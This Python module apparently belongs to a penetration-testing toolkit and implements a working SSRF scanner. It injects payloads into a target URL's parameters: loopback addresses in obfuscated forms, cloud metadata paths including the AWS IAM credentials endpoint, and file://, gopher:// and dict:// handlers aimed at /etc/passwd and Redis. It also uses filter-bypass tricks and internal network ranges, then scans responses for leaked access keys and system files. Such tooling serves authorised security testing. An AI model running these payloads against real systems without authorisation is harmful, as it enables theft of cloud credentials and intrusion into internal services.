"""Server-Side Request Forgery (SSRF) vulnerability scanner.

Tests URL parameters for SSRF vulnerabilities by injecting internal network
addresses, cloud metadata endpoints, protocol handlers, and redirect chains.
"""

import asyncio
import re
import time
from typing import Any
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import aiohttp

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)

# Internal / localhost payloads
INTERNAL_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",          # octal
    "http://2130706433",           # decimal
    "http://0x7f000001",           # hex
    "http://127.1",                # shorthand
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:11211",
    "http://127.0.0.1:27017",
]

# Cloud metadata endpoints
CLOUD_METADATA_PAYLOADS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
]

# Protocol handler payloads
PROTOCOL_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
    "ftp://127.0.0.1/",
]

# Bypass techniques for SSRF filters
BYPASS_PAYLOADS = [
    # URL encoding
    "http://%31%32%37%2e%30%2e%30%2e%31",
    # Double URL encoding
    "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531",
    # DNS rebinding style
    "http://spoofed.burpcollaborator.net",
    "http://localtest.me",          # resolves to 127.0.0.1
    "http://127.0.0.1.nip.io",
    "http://www.oastify.com",
    # CRLF / redirect bypass
    "http://evil.com@127.0.0.1",
    "http://127.0.0.1#@evil.com",
    "http://127.0.0.1%23@evil.com",
    # URL with credentials
    "http://user:pass@127.0.0.1",
    # Enclosed alphanumerics
    "http://\u24DB\u24DE\u24D2\u24D0\u24DB\u24D7\u24DE\u24E2\u24E3",  # unicode "localhost"
    # Redirect via 30x
    "http://httpbin.org/redirect-to?url=http://127.0.0.1",
]

# Internal network range scanning payloads
INTERNAL_NETWORK_PAYLOADS = [
    "http://10.0.0.1",
    "http://10.0.0.1:8080",
    "http://172.16.0.1",
    "http://172.16.0.1:8080",
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://192.168.1.1:8080",
]

# Indicators that SSRF was successful in response content
SSRF_SUCCESS_INDICATORS = {
    "localhost_access": [
        r"root:.*?:0:0:",                        # /etc/passwd
        r"daemon:.*?:/usr/sbin",                  # /etc/passwd
        r"\[extensions\]",                        # win.ini
        r"for 16-bit app support",                # win.ini
        r"<title>.*?Dashboard.*?</title>",        # internal dashboards
        r"Server:\s+Apache",                      # internal Apache
        r"Server:\s+nginx",                       # internal nginx
    ],
    "cloud_metadata": [
        r"ami-[a-f0-9]+",                         # AWS AMI ID
        r"instance-id",                            # AWS/GCP instance ID
        r"iam.*?security-credentials",             # AWS IAM
        r"AccessKeyId",                            # AWS credentials
        r"SecretAccessKey",                        # AWS credentials
        r"availabilityZone",                       # AWS zone
        r"computeMetadata",                        # GCP metadata
        r"subscriptionId",                         # Azure metadata
        r'"project":\s*\{',                        # GCP project
    ],
    "internal_service": [
        r"redis_version:",                         # Redis
        r"MongoDB server version",                 # MongoDB
        r"mysql_native_password",                  # MySQL
        r"OpenSSH",                                # SSH banner
        r"Elasticsearch",                          # Elasticsearch
        r"memcached",                              # Memcached
    ],
}


class SsrfScannerModule(AtsModule):
    """Test URL parameters for Server-Side Request Forgery vulnerabilities."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="ssrf_scanner",
            category=ModuleCategory.PENTEST,
            description="Test URL parameters for SSRF vulnerabilities using internal addresses, cloud metadata endpoints, protocol handlers, and bypass techniques",
            version="1.0.0",
            parameters=[
                Parameter(name="url", type=ParameterType.URL,
                          description="Target URL with parameters to test for SSRF",
                          required=True),
                Parameter(name="parameters", type=ParameterType.STRING,
                          description="Comma-separated list of parameters to test (empty = all URL-like params)",
                          required=False, default=""),
                Parameter(name="test_categories", type=ParameterType.CHOICE,
                          description="Categories of SSRF payloads to test",
                          choices=["all", "internal", "cloud_metadata", "protocol", "bypass", "network"],
                          default="all"),
                Parameter(name="follow_redirects", type=ParameterType.BOOLEAN,
                          description="Follow HTTP redirects during testing",
                          default=False),
            ],
            outputs=[
                OutputField(name="vulnerabilities", type="list",
                            description="Detected SSRF vulnerabilities with evidence"),
                OutputField(name="summary", type="dict",
                            description="Scan summary with statistics"),
            ],
            requires_api_key=False,
            api_key_service=None,
            tags=["pentest", "ssrf", "web", "injection", "cloud", "metadata"],
            author="ATS-Toolkit",
            dangerous=True,
        )

    def validate_inputs(self, config: dict[str, Any]) -> tuple[bool, str]:
        url = config.get("url", "").strip()
        if not url:
            return False, "URL is required"
        if not url.startswith(("http://", "https://")):
            return False, "URL must start with http:// or https://"
        return True, ""

    def _extract_params(self, url: str, param_filter: str) -> list[str]:
        """Extract query parameters, optionally filtering to specific ones."""
        parsed = urlparse(url)
        all_params = list(parse_qs(parsed.query).keys())
        if param_filter:
            selected = [p.strip() for p in param_filter.split(",") if p.strip()]
            return [p for p in all_params if p in selected]
        return all_params

    def _identify_url_params(self, url: str, params: list[str]) -> list[str]:
        """Identify parameters whose values look like URLs or paths."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        url_params = []
        for param in params:
            values = qs.get(param, [])
            for val in values:
                if (val.startswith(("http://", "https://", "//", "/"))
                        or re.match(r'^[a-zA-Z]+://', val)
                        or "." in val):
                    url_params.append(param)
                    break
        # If no URL-like params detected, test all params anyway
        return url_params if url_params else params

    def _build_injected_url(self, url: str, param: str, payload: str) -> str:
        """Replace a query parameter value with the SSRF payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _get_payloads(self, category: str) -> list[tuple[str, str]]:
        """Build list of (payload, category) tuples based on test category."""
        payloads: list[tuple[str, str]] = []
        if category in ("all", "internal"):
            payloads.extend([(p, "internal") for p in INTERNAL_PAYLOADS])
        if category in ("all", "cloud_metadata"):
            payloads.extend([(p, "cloud_metadata") for p in CLOUD_METADATA_PAYLOADS])
        if category in ("all", "protocol"):
            payloads.extend([(p, "protocol") for p in PROTOCOL_PAYLOADS])
        if category in ("all", "bypass"):
            payloads.extend([(p, "bypass") for p in BYPASS_PAYLOADS])
        if category in ("all", "network"):
            payloads.extend([(p, "network") for p in INTERNAL_NETWORK_PAYLOADS])
        return payloads

    def _check_response_indicators(self, body: str, category: str) -> list[dict[str, str]]:
        """Check response body for SSRF success indicators."""
        matches = []
        for indicator_cat, patterns in SSRF_SUCCESS_INDICATORS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    matches.append({
                        "indicator_category": indicator_cat,
                        "pattern": pattern,
                    })
        return matches

    def _analyze_response(self, status: int, body: str, headers: dict[str, str],
                           baseline_len: int, baseline_status: int,
                           payload: str, category: str) -> dict[str, Any] | None:
        """Analyze a response for signs of successful SSRF."""
        findings: dict[str, Any] = {
            "indicators": [],
            "suspicious": False,
        }

        # Check for content indicators
        indicators = self._check_response_indicators(body, category)
        if indicators:
            findings["indicators"] = indicators
            findings["suspicious"] = True

        # Status code anomalies
        if baseline_status != 0 and status != baseline_status:
            # Server error might indicate backend tried to connect
            if status >= 500 and baseline_status < 500:
                findings["indicators"].append({
                    "indicator_category": "status_anomaly",
                    "pattern": f"Server error {status} (baseline was {baseline_status})",
                })
                findings["suspicious"] = True

        # Response size anomaly
        if baseline_len > 0:
            size_diff = abs(len(body) - baseline_len)
            diff_ratio = size_diff / baseline_len if baseline_len else 0
            if diff_ratio > 0.5 and size_diff > 200:
                findings["indicators"].append({
                    "indicator_category": "size_anomaly",
                    "pattern": f"Response size differs by {size_diff} bytes ({diff_ratio:.0%})",
                })
                findings["suspicious"] = True

        # Time-based detection (handled separately)

        if findings["suspicious"]:
            return findings
        return None

    async def _get_baseline(self, session: aiohttp.ClientSession, url: str,
                             param: str, follow_redirects: bool) -> tuple[int, str, int]:
        """Get baseline response for comparison."""
        baseline_url = self._build_injected_url(url, param, "https://www.example.com")
        try:
            async with session.get(baseline_url, timeout=aiohttp.ClientTimeout(total=10),
                                   ssl=False, allow_redirects=follow_redirects) as resp:
                body = await resp.text(errors="replace")
                return resp.status, body, len(body)
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return 0, "", 0

    async def _test_param_payloads(self, session: aiohttp.ClientSession, url: str,
                                    param: str, payloads: list[tuple[str, str]],
                                    follow_redirects: bool) -> list[dict[str, Any]]:
        """Test a single parameter with all SSRF payloads."""
        vulnerabilities: list[dict[str, Any]] = []

        # Get baseline
        baseline_status, baseline_body, baseline_len = await self._get_baseline(
            session, url, param, follow_redirects
        )

        for payload, category in payloads:
            injected_url = self._build_injected_url(url, param, payload)
            try:
                start = time.perf_counter()
                async with session.get(injected_url, timeout=aiohttp.ClientTimeout(total=15),
                                       ssl=False, allow_redirects=follow_redirects) as resp:
                    elapsed = time.perf_counter() - start
                    body = await resp.text(errors="replace")
                    headers = {k.lower(): v for k, v in resp.headers.items()}

                    analysis = self._analyze_response(
                        resp.status, body, headers,
                        baseline_len, baseline_status,
                        payload, category,
                    )

                    if analysis:
                        severity = "high"
                        if any(i["indicator_category"] == "cloud_metadata"
                               for i in analysis["indicators"]):
                            severity = "critical"
                        elif any(i["indicator_category"] in ("status_anomaly", "size_anomaly")
                                 for i in analysis["indicators"]):
                            severity = "medium"

                        vulnerabilities.append({
                            "type": f"ssrf_{category}",
                            "parameter": param,
                            "payload": payload,
                            "status_code": resp.status,
                            "response_length": len(body),
                            "response_time_ms": int(elapsed * 1000),
                            "indicators": analysis["indicators"],
                            "severity": severity,
                            "url": injected_url[:500],
                        })

                    # Time-based detection: unusually slow response
                    if elapsed > 5.0 and category in ("internal", "network"):
                        vulnerabilities.append({
                            "type": f"ssrf_time_based_{category}",
                            "parameter": param,
                            "payload": payload,
                            "status_code": resp.status,
                            "response_time_ms": int(elapsed * 1000),
                            "severity": "medium",
                            "description": f"Slow response ({elapsed:.1f}s) may indicate backend connection attempt",
                            "url": injected_url[:500],
                        })

            except asyncio.TimeoutError:
                # Timeout could indicate the server is trying to connect
                if category in ("internal", "network", "cloud_metadata"):
                    vulnerabilities.append({
                        "type": f"ssrf_timeout_{category}",
                        "parameter": param,
                        "payload": payload,
                        "severity": "low",
                        "description": "Request timed out - server may be attempting backend connection",
                        "url": injected_url[:500],
                    })
            except aiohttp.ClientError:
                continue

        return vulnerabilities

    async def execute(self, config: dict[str, Any]) -> dict[str, Any]:
        url = config["url"].strip()
        param_filter = config.get("parameters", "")
        test_categories = config.get("test_categories", "all")
        follow_redirects = config.get("follow_redirects", False)

        params = self._extract_params(url, param_filter)
        if not params:
            return {
                "vulnerabilities": [],
                "summary": {
                    "error": "No query parameters found in URL to test",
                    "url": url,
                    "total_tests": 0,
                    "vulnerabilities_found": 0,
                },
            }

        # Prioritize URL-like parameters
        url_params = self._identify_url_params(url, params)
        payloads = self._get_payloads(test_categories)

        self.logger.info("ssrf_scan_start", url=url, params=url_params,
                         payload_count=len(payloads))

        all_vulns: list[dict[str, Any]] = []
        connector = aiohttp.TCPConnector(limit=5, ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            for param in url_params:
                vulns = await self._test_param_payloads(
                    session, url, param, payloads, follow_redirects
                )
                all_vulns.extend(vulns)

        # Deduplicate by (parameter, type, severity)
        seen: set[str] = set()
        deduped: list[dict[str, Any]] = []
        for v in all_vulns:
            key = f"{v.get('parameter')}|{v.get('type')}|{v.get('severity')}"
            if key not in seen:
                seen.add(key)
                deduped.append(v)

        summary = {
            "url": url,
            "parameters_tested": url_params,
            "test_categories": test_categories,
            "total_payloads": len(payloads),
            "total_tests": len(payloads) * len(url_params),
            "vulnerabilities_found": len(deduped),
            "severity_breakdown": {
                "critical": sum(1 for v in deduped if v.get("severity") == "critical"),
                "high": sum(1 for v in deduped if v.get("severity") == "high"),
                "medium": sum(1 for v in deduped if v.get("severity") == "medium"),
                "low": sum(1 for v in deduped if v.get("severity") == "low"),
            },
        }

        self.logger.info("ssrf_scan_complete", vulns=len(deduped),
                         tests=summary["total_tests"])
        return {"vulnerabilities": deduped, "summary": summary}
